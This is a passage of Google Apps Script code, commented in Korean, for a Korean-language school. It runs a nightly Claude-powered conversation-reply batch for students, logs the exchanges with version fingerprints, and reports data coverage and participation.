 * ⚠ 새 열은 **반드시 끝에** 붙인다 — 이 시트는 r[1]·r[2]·r[3]·r[4]·r[6] 위치 접근을 쓴다(앞에 끼우면 전부 밀린다).
 * [v9.187] `급수`(맨 끝) — 대화 시점의 학생 급수. 답장이 급수에 맞춰 조절되므로(아래 시스템 프롬프트)
 *   「몇 급 학생의 문장인가」가 없으면 2년 뒤 이 대화들을 난이도 층으로 가를 수 없다(소급 불가 계열). */
const TALK_LOG_HEADERS = ['id', 'student_id', '턴', '학생문', 'AI답', '오류태그', '제출일', 'created_at', 'model', 'prompt_ver', 'audio_ref', '급수', 'schema_ver'];
const TALK_MAX_PER_RUN = 25;   // 야간 1회 상한 — 초과분은 포인터가 남아 다음 밤 이어진다(첨삭 배치와 같은 규약)
const TALK_CONTEXT_TURNS = 6;  // 문맥으로 되돌려 보내는 직전 턴 수 — 「대화」가 되려면 앞말을 기억해야 한다

/* 대화 시스템 프롬프트 — 상수로 뽑은 이유는 재사용이 아니라 **버전을 기계가 계산하게** 하기 위해서다. */
const TALK_SYSTEM_PROMPT = 'SYNK LAB(몽골 울란바토르 한국어 학원)의 한국어 대화 상대. 학생과 한국어로 편지처럼 주고받는다. '
  + '학생의 급수(1~6, 0=미정)에 맞춰 어휘·문장 길이를 조절한다 — 급수가 낮으면 짧고 쉬운 문장만 쓴다. '
  + '규칙: ①먼저 학생이 쓴 **내용**에 사람처럼 반응한다(교정부터 하지 않는다 — 말이 막히는 이유는 문법이 아니라 재미가 없어서다) '
  + '②틀린 표현은 답장 맨 끝에 한 줄로만, 「이렇게 하면 더 자연스러워요: …」 형태로 ③반드시 질문 하나로 끝낸다 '
  + '④"패배·실패·부족" 같은 부정 단어 금지 ⑤AI·시스템 자기 언급 금지 ⑥학생이 몽골어로 써도 한국어로 답하되, '
  + '아주 어려워하면 핵심 단어만 몽골어를 괄호 병기한다 ⑦개인정보(주소·전화·비밀번호)를 묻지 않는다.';

/* prompt_ver — **사람이 올리는 번호가 아니라 프롬프트에서 계산한 지문(8자리)**이다.
 *
 * 손으로 관리하는 버전 상수는 언젠가 반드시 안 올라간다. 그 순간 이 열은 「참인 채 거짓을 말하는」 열이 된다
 *   — 값이 v3이라고 적혀 있는데 실제 프롬프트는 다른 것(하루에 2건 겪은 실패 유형: catch의 「대체했다」·
 *   getSharingAccess의 파일 자신만 보기). 잘못 쓸 수 없는 통로를 만드는 쪽이 조항을 하나 더 붙이는 것보다 낫다.
 * 무엇이 답을 바꾸는가 = 시스템 프롬프트 + 모델 + 문맥 턴 수. 셋 중 **하나라도 바뀌면 지문이 바뀐다.**
 *   해시만으로는 「무엇이」 바뀌었는지 모르지만, 데이터를 층으로 가르는 데 필요한 것은 「언제 갈렸는가」이고
 *   실제 내용은 git 이력에 있다.
 * ⚠ 톱레벨에서 계산하지 않는다 — AI_FEEDBACK_MODEL은 Code.js에 있고 라이브 파일 로드 순서가 보장되지 않는다
 *   (Code.js 주석 190번 · 골격 지연 평가와 같은 이유). 반드시 호출 시점에 계산한다. */
function talkPromptVer_() {
  const raw = TALK_SYSTEM_PROMPT + '|model=' + (typeof AI_FEEDBACK_MODEL === 'undefined' ? '?' : AI_FEEDBACK_MODEL)
    + '|ctx=' + TALK_CONTEXT_TURNS;
  const d = Utilities.computeDigest(Utilities.DigestAlgorithm.MD5, raw, Utilities.Charset.UTF_8);
  return d.map(b => ((b & 0xFF) + 0x100).toString(16).slice(1)).join('').slice(0, 8);
}

/* 이미 만들어진 talk_log에 **새 열의 이름표를 붙인다.**
 * `ensureSheet`는 시트가 **없을 때만** 헤더를 쓴다(Code.js) — 그래서 v9.139로 이미 8열짜리가
 * 라이브에 서 있으면, 긴 행을 append해도 데이터만 들어가고 머리글은 8개인 채로 남는다.
 * 값은 있는데 그 열이 무엇인지 아무도 모르는 상태 = 「모름」을 「정상」으로 바꾸는 그 형태다.
 * 이름은 소비처(talkBatch_·talkLogCheck)가 불러서 유지, 본체는 공용 치유(헤더보정_·멱등)로. */
function talkHeaderHeal_(sh) {
  헤더보정_(sh, TALK_LOG_HEADERS);
}

function createTalkForm() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const done = formAlreadyMade_(ss, '대화폼_응답', '대화폼URL틀', '대화폼ID', '학생ID', '한국어 대화 폼');
  if (done) return done;
  const before = ss.getSheets().map(s => s.getName());
  const form = FormApp.create('SYNK 한국어로 말 걸기')
    .setDescription('오늘 있었던 일, 궁금한 것, 아무거나 한국어로 써 보세요. 내일 아침에 답장이 와 있어요 💬')
    .setCollectEmail(false);
  setState(ensureSheet(ss, 'app_state', ['key', 'value']), '대화폼ID', form.getId());
  form.addTextItem().setTitle('학생ID').setRequired(true).setHelpText('앱에서 열었다면 자동으로 채워져 있어요');
  form.addParagraphTextItem().setTitle('하고 싶은 말').setRequired(true)
    .setHelpText('틀려도 괜찮아요 — 틀린 곳은 답장에서 살짝 고쳐 줍니다. 짧아도 좋아요');
  form.setDestination(FormApp.DestinationType.SPREADSHEET, ss.getId());
  linkFormTab_(ss, before, '대화폼_응답');
  const st = ensureSheet(ss, 'app_state', ['key', 'value']);
  setState(st, '대화폼ID', form.getId());
  setState(st, '대화폼URL틀', prefillTemplateOf_(form, '학생ID'));
  Logger.log('✅ 한국어 대화 폼 생성 완료! 야간 배치(22시)가 답장을 만듭니다.');
  return '한국어 대화 폼 생성 완료 — 학생별 주소가 다음 calcAll부터 profiles 「대화폼URL」 열에 채워집니다. 지금은 그 주소를 학생에게 직접 주고, 새 앱이 서면 「한국어로 말 걸기」 버튼에 잇습니다.';
}

/* 직전 턴들을 Claude messages 형식으로 — 이게 있어야 「대화」이고, 없으면 매번 처음 만난 사이가 된다.
 * rows를 **인자로 받는다**: 학생마다 시트를 다시 읽으면 25명 배치가 전체 읽기를 25번 한다
 *   (attDayMapCached_가 반 18개 × 전체 읽기로 배운 것과 같은 계급 — 호출부가 이미 한 번 읽으므로 추가 읽기 0).
 * 답장이 빈 행(API 실패로 학생 문장만 남은 행)은 assistant 턴을 만들지 않는다 — 빈 assistant는 API가 거부한다. */
function talkHistory_(rows, sid) {
  if (!rows || !rows.length) return [];
  const mine = rows.filter(r => String(r[1] || '').trim() === sid).slice(-TALK_CONTEXT_TURNS);
  const msgs = [];
  mine.forEach(r => {
    if (String(r[3] || '').trim()) msgs.push({ role: 'user', content: String(r[3]) });
    if (String(r[4] || '').trim()) msgs.push({ role: 'assistant', content: String(r[4]) });
  });
  return msgs;
}

function callClaudeTalk_(apiKey, stu, history, text) {
  if (isRehearsal_()) { rehearsalNote_('AI 대화 callClaudeTalk_ (차단·비용 0)'); throw new Error('리허설 모드: AI 호출 차단'); }
  const schema = {
    type: 'object', additionalProperties: false,
    required: ['reply', 'error_tags'],
    properties: {
      reply: { type: 'string', description: '한국어 답장 2~4문장. 먼저 내용에 진짜로 반응하고, 틀린 표현이 있으면 마지막에 한 줄로 부드럽게 고쳐 준다. 반드시 질문 하나로 끝내 대화가 이어지게 한다' },
      error_tags: { type: 'array', maxItems: 4, items: { type: 'string', enum: HW_ERROR_TAGS }, description: '학생 문장에서 발견한 오류 유형(집계용·학생에게 안 보임). 없으면 ["오류없음"]' }
    }
  };
  const body = {
    model: AI_FEEDBACK_MODEL,
    max_tokens: 2048,
    /* 상수 참조 — 여기 인라인으로 되돌리면 prompt_ver가 변경을 못 본다.
     * [v9.187] 급수 접미 — 프롬프트는 처음부터 「급수에 맞춰 조절」을 지시했는데 정작 급수를 **안 보내고 있었다**
     *   (stu 인자를 받고도 본문에서 한 번도 안 씀 — 모델은 학생 문장에서 급수를 추측할 수밖에 없었다).
     *   급수는 학생마다 다른 **데이터**라 지문(prompt_ver)에는 안 넣는 게 맞다 — 지문은 상수부만 잰다. */
    system: TALK_SYSTEM_PROMPT + '\n[이 학생] 급수: ' + (stu.lv || '미정'),
    messages: history.concat([{ role: 'user', content: text }]),
    output_config: { format: { type: 'json_schema', schema: schema } }
  };
  const res = UrlFetchApp.fetch('https://api.anthropic.com/v1/messages', {
    method: 'post', contentType: 'application/json',
    headers: { 'x-api-key': apiKey, 'anthropic-version': '2023-06-01' },
    payload: JSON.stringify(body), muteHttpExceptions: true
  });
  const permErr = msg => { const e = new Error(msg); e.permanent = true; return e; };
  const rc = res.getResponseCode();
  if (rc !== 200) {
    const e = new Error('Claude API ' + rc + ': ' + res.getContentText().slice(0, 200));
    e.permanent = (rc === 400 || rc === 404 || rc === 413 || rc === 422);
    throw e;
  }
  const j = JSON.parse(res.getContentText());
  AI사용_기록_('대화', j.usage);   // [T4] 아래 게이트들이 답장을 버려도 이 호출은 이미 과금됐다(정본 = 엔진_콘텐츠AI.js AI 토큰 장부)
  if (j.stop_reason === 'refusal') throw permErr('Claude 거부(refusal)');
  if (j.stop_reason === 'max_tokens') throw permErr('출력 잘림(max_tokens)');
  const tb = (j.content || []).filter(b => b.type === 'text')[0];
  if (!tb || !tb.text) throw permErr('응답에 text 블록 없음(stop_reason=' + j.stop_reason + ')');
  let 값;
  try { 값 = JSON.parse(tb.text); } catch (e) { throw permErr('대화 JSON 파싱 실패: ' + String(tb.text).slice(0, 80)); }
  /* [v9.223] 옛 글자(한자·가나) — 유호님 확정 「쓰는 문자 셋뿐」. 이 반환값은 talk_log 를 거쳐 학생이 읽는 AI 답이다.
   *   🔑 **`permErr`(영구)로 올린다** — 이 배치에서 「영구」는 유실이 아니라 **격리**다: 호출부가 학생 문장을 그대로
   *      적재하고 답장 칸만 비우며(대화 데이터의 절반은 보존) 관리자 메일이 그 건수를 센다. 일시로 올리면 `break` 라
   *      그 행이 배치 머리에 걸려 **그날 이후 모든 학생의 답장이 조용히 멈춘다** — 새는 방향이 훨씬 나쁘다.
   *   ⚠ 대가는 그 한 턴의 답장이 다시 안 만들어지는 것이다(재시도 없음). 비결정적 결함이라 재시도가 대개 통과하지만
   *      (형제 실측: 같은 판 8벌 중 6벌 깨끗) 재시도를 사려면 배치 정지를 사야 해서 이쪽을 골랐다. */
  const 옛 = 옛글자걸림_(값);
  if (옛) throw permErr('옛 글자 감지(' + 옛.칸 + ':' + 옛.짚음 + ') — 답장 폐기(학생 문장은 남는다)');
  return 값;
}

/* 야간 배치 — 대화폼_응답 → talk_log(학생문 + AI답).
 * 포인터·상한·오류 분류는 aiFeedbackBatch_와 같은 규약을 그대로 쓴다(같은 실패 모드를 두 번 배우지 않게). */
function talkBatch_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const props = PropertiesService.getScriptProperties();
  const apiKey = props.getProperty('CLAUDE_API_KEY');
  if (!apiKey) return; // 키 미설정 = 기능 OFF
  const src = ss.getSheetByName('대화폼_응답');
  if (!src || src.getLastRow() < 2) return;
  const last = src.getLastRow();
  const from = Number(props.getProperty('대화폼_포인터')) || 1;
  if (from > last) { props.setProperty('대화폼_포인터', String(last)); return; }
  if (from >= last) return;
  const tz = ss.getSpreadsheetTimeZone();
  const rows = src.getRange(from + 1, 1, last - from, 3).getValues(); // 타임스탬프·학생ID·하고 싶은 말
  if (isRehearsal_()) { rehearsalNote_('AI 대화 배치: 대기 ' + rows.length + '건 전량 차단(비용 0·포인터 불변)'); return; }

  const info = {};
  const pf = ss.getSheetByName('profiles');
  if (pf && pf.getLastRow() >= 2) pf.getRange(2, 1, pf.getLastRow() - 1, 67).getValues().forEach(r => {
    if (r[0] && r[3] === 'student') info[String(r[0]).trim()] = { name: r[1] || r[0], lv: Number(r[66]) || 0 };
  });
  const tl = ensureSheet(ss, 'talk_log', TALK_LOG_HEADERS);
  talkHeaderHeal_(tl);   // [v9.145] 이미 서 있는 8열 시트에 model·prompt_ver 이름표를 붙인다
  // 학생당 하루 1턴 — 상한이 없으면 한 명이 밤새 눌러 그날 예산을 혼자 태운다(비용은 사람 수가 아니라 열정에 비례한다)
  const today = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd');
  const turns = {}, todayDone = {};
  // 전체를 **한 번만** 읽고 턴 수·오늘 여부·대화 문맥을 같은 배열에서 얻는다(학생마다 재읽기 금지)
  const logRows = tl.getLastRow() >= 2 ? tl.getRange(2, 1, tl.getLastRow() - 1, TALK_LOG_HEADERS.length).getValues() : [];
  logRows.forEach(r => {
    const s = String(r[1] || '').trim();
    if (!s) return;
    turns[s] = Math.max(turns[s] || 0, Number(r[2]) || 0);
    if (String(r[6] || '') === today) todayDone[s] = 1;
  });

  const pver = talkPromptVer_();          // 실행 1회 계산 — 배치 중엔 안 바뀐다
  const model = typeof AI_FEEDBACK_MODEL === 'undefined' ? '' : AI_FEEDBACK_MODEL;
  const t0 = Date.now();
  const BUDGET_MS = 120000;
  let made = 0, processed = 0, skipped = 0, permFails = 0, lastErr = '';
  const badSid = [];
  for (let i = 0; i < rows.length; i++) {
    if (made >= TALK_MAX_PER_RUN || Date.now() - t0 > BUDGET_MS) break;
    const ts = rows[i][0] instanceof Date ? rows[i][0] : new Date();
    const sid = String(rows[i][1] || '').trim();
    const text = String(rows[i][2] || '').trim().slice(0, 1500);
    const stu = info[sid];
    if (!sid || !stu || !text) { if (sid && !stu) badSid.push(sid); processed = i + 1; continue; }
    if (todayDone[sid]) { skipped++; processed = i + 1; props.setProperty('대화폼_포인터', String(from + processed)); continue; }
    try {
      const turn = (turns[sid] || 0) + 1;
      const card = callClaudeTalk_(apiKey, stu, talkHistory_(logRows, sid), text);
      // 🔒 학생문은 물론 AI답도 감싼다 — 프롬프트 인젝션으로 모델에게 `=…`로 시작하는 답을 뱉게 할 수 있다
      const row = ['TK' + Utilities.formatDate(new Date(), tz, 'yyyyMMdd') + '-' + sid + '-' + turn, sid, turn,
        셀안전_(text), 셀안전_(String(card.reply || '')), hwTagsClean_(card.error_tags), dstr(ts, tz), new Date(),
        // [v9.151] audio_ref — 텍스트 폼 경로는 빈칸(녹음이 붙는 날 원본 참조가 들어온다) · [v9.187] 급수 스냅샷
        model, pver, '', Number(stu.lv) || 0, SCHEMA_VER]; // [v9.207] schema_ver — 행이 자기 규격을 들고 있게(A-8)
      tl.appendRow(row);
      logRows.push(row); // 같은 실행 안에서 같은 학생이 여러 번 나와도 문맥이 이어지게(하루 1턴 가드가 있어 드물지만 공짜다)
      turns[sid] = turn; todayDone[sid] = 1;
      made++; processed = i + 1;
      props.setProperty('대화폼_포인터', String(from + processed)); // 성공분 즉시 전진 — 6분 하드킬에도 중복 과금 0
      Utilities.sleep(300);
    } catch (e) {
      if (e && e.permanent) {
        // 답장을 못 만들어도 **학생이 쓴 문장은 남긴다** — 대화 데이터의 절반은 이미 여기 있다
        permFails++;
        // 실패 행에도 model·prompt_ver·급수를 남긴다 — 「어느 버전에서 실패가 몰렸나」가 나중에 유일한 단서다
        tl.appendRow(['TK' + Utilities.formatDate(new Date(), tz, 'yyyyMMdd') + '-' + sid + '-오류', sid, (turns[sid] || 0) + 1,
          셀안전_(text), '', '', dstr(ts, tz), new Date(), model, pver, '', Number(stu.lv) || 0, SCHEMA_VER]);
        processed = i + 1;
        props.setProperty('대화폼_포인터', String(from + processed));
        continue;
      }
      lastErr = String(e && e.message ? e.message : e).slice(0, 200);
      break;
    }
  }
  if (processed > 0) props.setProperty('대화폼_포인터', String(from + processed));
  notifyDroppedSids_('대화폼', badSid);
  if (made || permFails || lastErr) adminMail('[SYNK] 🗣 AI 대화 답장 ' + made + '건'
    + (skipped ? ' · 하루 1턴 초과 스킵 ' + skipped : '') + (permFails ? ' · 오류 ' + permFails + '건' : '') + (lastErr ? ' · 중단됨' : ''),
    '답장은 talk_log에 적재됐습니다(외부 발송 0 — 학생은 앱에서 읽습니다).\n'
    + (permFails ? '\n오류 ' + permFails + '건은 학생 문장만 남기고 답장을 비웠습니다(대화 데이터의 절반은 보존).' : '')
    + (lastErr ? '\n마지막 오류: ' + lastErr + '\n실패 지점부터 내일 밤 자동 재시도합니다.' : ''));
}

/* [v9.146] 🔎 대화 수집 점검 — 「오늘 밤 배치에 잘 들어갔나」를 10초에 답한다.
 *
 * 왜 필요한가: v9.145로 `model`·`prompt_ver` 2열을 넣었는데, **확인할 방법이 없었다.**
 *   시트를 눈으로 열어도 「비어 있는 게 정상인지 고장인지」를 구분할 수 없다 —
 *   `talkBatch_`는 조기 반환이 4개(키 없음·응답 0건·포인터 끝·리허설)이고, 그중 무엇에 걸려도
 *   증상은 똑같이 **「아무 일도 안 일어남」**이다. 「모름」과 「정상」이 같은 모양인 그 형태다.
 * 그래서 이 함수는 결과가 아니라 **조건부터** 보여준다 — 안 생겼다면 넷 중 무엇 때문인지 지목한다.
 *
 * ⚠ 읽기 전용이 **아니다**(헤더 치유를 겸한다). 그게 의도다 —
 *   `talkHeaderHeal_`은 `talkBatch_` 안쪽 조기 반환 **뒤에** 있어서, 학생이 첫 대화를 쓰기 전까지는
 *   영영 실행되지 않는다. 여기서 부르면 배치를 기다리지 않고 지금 이름표가 붙는다. 멱등이라 여러 번 눌러도 안전. */
function talkLogCheck() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const props = PropertiesService.getScriptProperties();
  const out = [];

  out.push('■ 배치가 돌기 위한 조건');
  out.push(props.getProperty('CLAUDE_API_KEY')
    ? '  ✅ CLAUDE_API_KEY 설정됨'
    : '  ⛔ CLAUDE_API_KEY 없음 → 대화 기능 전체가 꺼져 있습니다(밤 배치가 0초에 끝납니다)');
  const src = ss.getSheetByName('대화폼_응답');
  if (!src) {
    out.push('  ⛔ 「대화폼_응답」 시트 없음 → SYNK 메뉴 「🗣 한국어 대화 폼 만들기」를 먼저 누르세요');
  } else {
    const answered = Math.max(0, src.getLastRow() - 1);
    if (!answered) {
      out.push('  ⏸ 대화폼 응답 0건 → 학생이 쓴 글이 없어 오늘 밤 배치는 **아무것도 만들지 않습니다**(고장 아님)');
    } else {
      const ptr = Number(props.getProperty('대화폼_포인터')) || 1;
      out.push('  ✅ 응답 ' + answered + '건 · 아직 답장 안 만든 것 ' + Math.max(0, src.getLastRow() - ptr) + '건');
    }
  }
  if (isRehearsal_()) out.push('  ⚠ 지금 리허설 모드 → 배치가 입구에서 차단됩니다(비용 0·기록도 0)');

  out.push('', '■ talk_log 상태');
  const tl = ss.getSheetByName('talk_log');
  if (!tl) {
    out.push('  아직 없음 — 첫 답장이 만들어질 때 자동 생성됩니다');
  } else {
    talkHeaderHeal_(tl);   // 배치를 기다리지 않고 지금 이름표를 붙인다
    out.push('  머리글: ' + tl.getRange(1, 1, 1, TALK_LOG_HEADERS.length).getValues()[0].join(' · '));
    const n = Math.max(0, tl.getLastRow() - 1);
    out.push('  기록 ' + n + '행');
    if (n) {
      const show = Math.min(3, n);
      tl.getRange(tl.getLastRow() - show + 1, 1, show, TALK_LOG_HEADERS.length).getValues()
        .forEach(r => out.push('   · ' + r[0] + '   model=' + (r[8] || '(빈칸)') + '   prompt_ver=' + (r[9] || '(빈칸)')));
      out.push('  ※ v9.145 이전에 쌓인 행은 두 칸이 비어 있습니다 — 소급이 안 되는 값이라 정상입니다');
    }
  }

  out.push('', '■ 지금 배치가 쓸 값(위 기록과 대조하세요)');
  out.push('  model = ' + (typeof AI_FEEDBACK_MODEL === 'undefined' ? '(못 읽음)' : AI_FEEDBACK_MODEL));
  out.push('  prompt_ver = ' + talkPromptVer_());
  return out.join('\n');
}

/* ──────────────── ② 커버리지 계기판 — 양이 아니라 「유형」을 잰다 ──────────────── */

/* [v9.138] 📊 수집 커버리지 리포트 — 아무도 안 재던 지표.
 *
 * 왜 건수가 아니라 커버리지인가: 학생 150명 × 2년이면 3만 건 안팎이다. LLM 관점에서 그 양은
 *   모델을 바꾸지 못하고, 애초에 Claude는 이미 한국어를 안다. **이 데이터의 값은 「한국어를 가르치는
 *   재료」가 아니라 「몽골어 화자가 어디서 무너지는지의 지도」**이고, 지도는 넓이가 아니라 빈칸으로 평가된다.
 *   200명이 같은 조사 실수만 반복하면 3만 건이어도 유형 30개짜리 데이터다.
 *
 * 그래서 이 리포트는 **비어 있는 칸을 먼저 보여준다.** 그 칸이 곧 다음 시즌에 일부러 유도할 숙제·퀴즈다
 *   — 수집이 수동적 축적에서 능동적 사냥으로 바뀌는 지점이고, 「6개월마다 열어본다」의 실행 수단이다
 *   (데이터의 결함은 쌓을 때가 아니라 **쓸 때** 드러난다. 2년 뒤 처음 열어보면 되돌릴 방법이 없다).
 * 읽기 전용 — 시트를 쓰지 않는다(언제 눌러도 안전). */
/* [v9.166] opts.raw = true면 {text, stats}를 준다(기본 호출은 문자열 그대로 — menuDataCoverage 무영향).
 * 월간 자동 발화가 판단에 쓸 숫자를 **리포트 텍스트에서 파싱하지 않기 위해서**다.
 * 문구 앵커는 문구가 바뀌는 순간 조용히 죽고, 그 형태의 실패는 「경고가 안 온다」로 나타난다. */
function dataCoverageReport(opts) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const L = [];
  const 태그수 = {};
  HW_ERROR_TAGS.forEach(t => { 태그수[t] = 0; });

  // ① 숙제 첨삭 — 오류 태그 분포 + 3단 데이터(원문→교정→재작성) 완성 수
  const fb = ss.getSheetByName('hw_feedback');
  let 첨삭 = 0, 태그있음 = 0, 재작성 = 0, 문항연결 = 0, 강의요약 = 0;
  if (fb && fb.getLastRow() >= 2) {
    const w = Math.min(HW_FEEDBACK_HEADERS.length, fb.getLastColumn());
    fb.getRange(2, 1, fb.getLastRow() - 1, w).getValues().forEach(r => {
      첨삭++;
      const 출처 = String(r[11] || '').trim();                  // L 숙제ID(강의 한줄요약은 '강의:' 접두)
      if (출처.indexOf(LECTURE_SRC_PREFIX) === 0) 강의요약++;   // [v9.198] ㉡ 읽기 배선이 실제로 도는지 — 숙제 문항 연결과 섞으면 둘 다 못 읽는다
      else if (출처) 문항연결++;
      const tg = String(r[12] || '').trim();                    // M 오류태그
      if (tg) { 태그있음++; tg.split(',').forEach(t => { const k = t.trim(); if (k in 태그수) 태그수[k]++; }); }
      if (String(r[13] || '').trim()) 재작성++;                 // N 재작성원본
    });
  }
  const 빈칸 = HW_ERROR_TAGS.filter(t => t !== '오류없음' && !태그수[t]);
  const 상위 = HW_ERROR_TAGS.filter(t => 태그수[t] > 0).sort((a, b) => 태그수[b] - 태그수[a]).slice(0, 8);

  L.push('■ 숙제 첨삭 (원문↔교정 병렬쌍 — 가장 값나가는 자산)');
  L.push('  전체 ' + 첨삭 + '건 · 오류 태그 있음 ' + 태그있음 + '건 · 문항 연결 ' + 문항연결 + '건 · 재작성(3단) ' + 재작성 + '건');
  // [v9.198] 강의 한줄요약 편입분 — 분자만 보면 「도는지」를 알 수 없어 lecture_views 총량(분모)과 함께 낸다
  const vwSh = ss.getSheetByName('lecture_views');
  //   분모 = **편입 자격이 있는 행**(student_id·요약 둘 다 있는 것)이다. 이름 미매칭 행까지 세면 사람이 sid를
  //   채워 주기 전까지 영원히 미달로 보여, 진짜 고장(배치 정지)과 구분이 안 된다.
  const 요약총 = vwSh && vwSh.getLastRow() >= 2
    ? vwSh.getRange(2, 2, vwSh.getLastRow() - 1, 5).getValues()
      .filter(r => String(r[0] || '').trim() && String(r[4] || '').trim()).length : 0;
  if (요약총 || 강의요약) L.push('  강의 한줄요약 편입 ' + 강의요약 + '/' + 요약총 + '건' +
    (요약총 && !강의요약 ? ' — ⚠️ 한 건도 안 실렸습니다(야간 배치 미실행이거나 CLAUDE_API_KEY 휴면)' : ''));
  if (첨삭 && !태그있음) L.push('  ⚠️ 태그가 한 건도 없습니다 — v9.138 이전 제출분이거나 배치가 아직 안 돌았습니다(원문이 남아 있어 소급 재처리는 가능).');
  if (상위.length) L.push('  많이 틀리는 순: ' + 상위.map(t => t + ' ' + 태그수[t]).join(' · '));
  L.push('  🕳 아직 한 건도 못 잡은 오류 유형 ' + 빈칸.length + '/' + (HW_ERROR_TAGS.length - 1) + (빈칸.length ? ': ' + 빈칸.join(', ') : ' — 전 유형 확보'));

  // ② 퀴즈 — 「무엇을 골랐나」. 확신도 축이 실제로 채워지는지가 관건(비면 그 축은 없는 것과 같다)
  const ql = ss.getSheetByName('quiz_log');
  let 응답 = 0, 정답 = 0, 보류 = 0, 문항종 = {}, 찍음 = 0;
  if (ql && ql.getLastRow() >= 2) {
    /* [v9.207] 폭을 실제 시트에 맞춰 자른다 — 바로 아래 voice(`Math.min(9, …)`)·위 첨삭(`Math.min(HW…, …)`)과 같은 모양.
     *   이 리포트는 **읽기 전용이라 치유를 안 부른다.** 헤더 상수만 늘어난 뒤(schema_ver) 아직 배치가 안 돈
     *   라이브 시트를 읽으면 상수 폭이 시트 폭을 넘어 getRange 가 던진다 — 리포트가 통째로 죽는다.
     *   읽는 칸은 r[2]·r[7]·r[8] 뿐이라 폭을 줄여도 세는 값은 하나도 안 변한다. */
    const qw = Math.min(QUIZ_LOG_HEADERS.length, ql.getLastColumn());
    ql.getRange(2, 1, ql.getLastRow() - 1, qw).getValues().forEach(r => {
      응답++;
      문항종[String(r[2] || '')] = 1;
      const v = String(r[7] || '');
      if (v === '정답') 정답++; else if (v === '판정보류') 보류++;
      if (String(r[8] || '') === '찍었어요') 찍음++;
    });
  }
  L.push('');
  L.push('■ 퀴즈 응답 (소급 절대 불가 축 — 그날 고른 답은 다시 못 받는다)');
  L.push('  응답 ' + 응답 + '건 · 다룬 문항 ' + Object.keys(문항종).length + '종 · 정답 ' + 정답 + ' · 판정보류 ' + 보류 + ' · 「찍었어요」 ' + 찍음);
  if (!응답) L.push('  ⚠️ 0건 — 퀴즈 응답 폼이 없거나(SYNK 메뉴 ▸ 퀴즈 응답 폼 만들기) 학생에게 주소가 아직 안 갔습니다(profiles 「퀴즈폼URL」 열).');
  else if (정답 + 보류 < 응답 * 0.99 && 응답 > 20) {
    const 정답률 = Math.round(정답 / Math.max(1, 응답 - 보류) * 100);
    L.push('  정답률 ' + 정답률 + '%(판정보류 제외) — 「찍었어요」인데 정답인 건은 아직 모르는 것으로 읽습니다.');
  }

  // ③ 음성 — 전사(STT)가 붙어야 라벨 있는 데이터가 된다
  const vl = ss.getSheetByName('voice_log');
  let 녹음 = 0, 전사 = 0;
  if (vl && vl.getLastRow() >= 2) {
    const w = Math.min(9, vl.getLastColumn());
    vl.getRange(2, 1, vl.getLastRow() - 1, w).getValues().forEach(r => { 녹음++; if (String(r[6] || '').trim()) 전사++; });
  }
  L.push('');
  L.push('■ 목소리  녹음 ' + 녹음 + '건 · 전사 완료 ' + 전사 + '건' + (녹음 && !전사 ? ' ⚠️ 전사 0 — 라벨 없는 오디오는 나중에 소급 가능하지만, 지금 붙이면 발음 오류 사전이 함께 자랍니다.' : ''));

  // ④ 대화 — 회화 앱의 핵심 재료. 「턴이 이어지는가」가 관건이다(1턴짜리만 쌓이면 그건 대화가 아니라 단문이다)
  const tl = ss.getSheetByName('talk_log');
  let 턴 = 0, 최장 = 0, 참여 = {};
  if (tl && tl.getLastRow() >= 2) {
    const tw = Math.min(TALK_LOG_HEADERS.length, tl.getLastColumn()); // [v9.207] 위 퀴즈와 같은 사유 — 읽는 칸은 r[1]·r[2] 뿐이다
    tl.getRange(2, 1, tl.getLastRow() - 1, tw).getValues().forEach(r => {
      턴++;
      const s = String(r[1] || '').trim();
      if (s) 참여[s] = Math.max(참여[s] || 0, Number(r[2]) || 0);
      최장 = Math.max(최장, Number(r[2]) || 0);
    });
  }
  const 학생수 = Object.keys(참여).length;
  L.push('');
  L.push('■ AI 대화 (회화 앱의 핵심 — 다른 어디서도 안 나오는 데이터)');
  L.push('  누적 ' + 턴 + '턴 · 참여 ' + 학생수 + '명 · 가장 긴 대화 ' + 최장 + '턴'
    + (학생수 ? ' · 평균 ' + (Math.round(턴 / 학생수 * 10) / 10) + '턴' : ''));
  if (!턴) L.push('  ⚠️ 0턴 — 대화 폼이 없거나(SYNK 메뉴 ▸ 한국어 대화 폼 만들기) CLAUDE_API_KEY가 없습니다.');
  else if (최장 < 3) L.push('  ⚠️ 아직 이어지는 대화가 없습니다(최장 ' + 최장 + '턴) — 답장이 질문으로 끝나는지, 학생이 답장을 읽는 화면이 있는지 확인하세요.');

  /* ⑤ [v9.147] 참여율 — **기능 압축의 부작용을 재는 유일한 계기다.**
   *   압축 판정의 축이 「학생을 로그 입구까지 데려오는가」였는데, 그걸 재는 숫자가 없으면
   *   압축이 감량인지 출혈인지 영영 모른 채 지나간다(적대 리뷰가 지목한 가장 큰 구멍).
   *   분모는 재원 학생 수, 분자는 최근 7일에 **무엇이든 하나라도 낸** 학생 수다 —
   *   총량(건수)은 소수의 열성 학생이 혼자 끌어올릴 수 있어 참여를 못 잰다. */
  const 최근 = new Date(Date.now() - 7 * 86400000);
  const 활동 = new Set();
  const 최근카운트 = (name, sidCol, dateCol, width) => {
    const sh = ss.getSheetByName(name);
    if (!sh || sh.getLastRow() < 2) return;
    const w = Math.min(width, sh.getLastColumn());
    sh.getRange(2, 1, sh.getLastRow() - 1, w).getValues().forEach(r => {
      const s = String(r[sidCol] || '').trim();
      const d = r[dateCol] ? asDate_(r[dateCol]) : null;
      if (s && d && d >= 최근) 활동.add(s);
    });
  };
  최근카운트('hw_feedback', 1, 2, 3);   // 숙제 제출(첨삭 행 = 제출의 증거)
  최근카운트('quiz_log', 1, 9, 10);      // 퀴즈 응답
  최근카운트('talk_log', 1, 6, 7);       // 대화
  let 재원 = 0;
  const pfC = ss.getSheetByName('profiles');
  if (pfC && pfC.getLastRow() >= 2) pfC.getRange(2, 1, pfC.getLastRow() - 1, 4).getValues().forEach(r => {
    if (r[0] && r[3] === 'student') 재원++;
  });
  L.push('');
  L.push('■ 참여율 (압축이 감량인지 출혈인지를 가르는 숫자)');
  L.push('  최근 7일에 하나라도 낸 학생 ' + 활동.size + '/' + 재원 + '명'
    + (재원 ? ' (' + Math.round(활동.size / 재원 * 100) + '%)' : ''));
